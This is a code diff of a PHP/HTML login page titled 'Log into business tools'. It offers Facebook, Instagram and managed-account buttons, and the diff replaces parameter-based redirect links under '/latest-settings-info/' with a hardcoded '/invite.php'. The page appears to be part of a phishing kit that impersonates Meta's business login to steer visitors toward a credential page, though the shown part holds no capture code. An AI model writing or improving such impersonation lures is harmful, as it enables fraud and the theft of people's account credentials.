@@ -1,14 +1,3 @@
-<?php
-// Get parameters from URL
-$param1 = isset($_GET['param1']) ? $_GET['param1'] : '';
-$param2 = isset($_GET['param2']) ? $_GET['param2'] : '';
-
-// Function to generate links with the correct path
-function generateLink($path) {
-    global $param1, $param2;
-    return "/latest-settings-info/{$param1}/{$param2}{$path}";
-}
-?>
 <!DOCTYPE html>
 <html lang="en">
 
@@ -42,11 +31,11 @@ function generateLink($path) {
         <div class="right">
             <div class="login-container">
                 <h2>Log into business tools</h2>
-                <button class="fb-btn" onclick="window.location.href='<?php echo generateLink('/invite'); ?>'">
+                <button class="fb-btn" onclick="window.location.href='/invite.php'">
                     <i class="fab fa-facebook fb-btn-icon"></i> Log in with Facebook </button>
-                <button class="ig-btn" onclick="window.location.href='<?php echo generateLink('/invite'); ?>'">
+                <button class="ig-btn" onclick="window.location.href='/invite.php'">
                     <i class="fab fa-instagram ig-btn-icon"></i> Log in with Instagram </button>
-                <p class="managed" onclick="window.location.href='<?php echo generateLink('/invite'); ?>'">Log in with a managed account</p>
+                <p class="managed" onclick="window.location.href='/invite'">Log in with a managed account</p>
             </div>
         </div>
     </div>
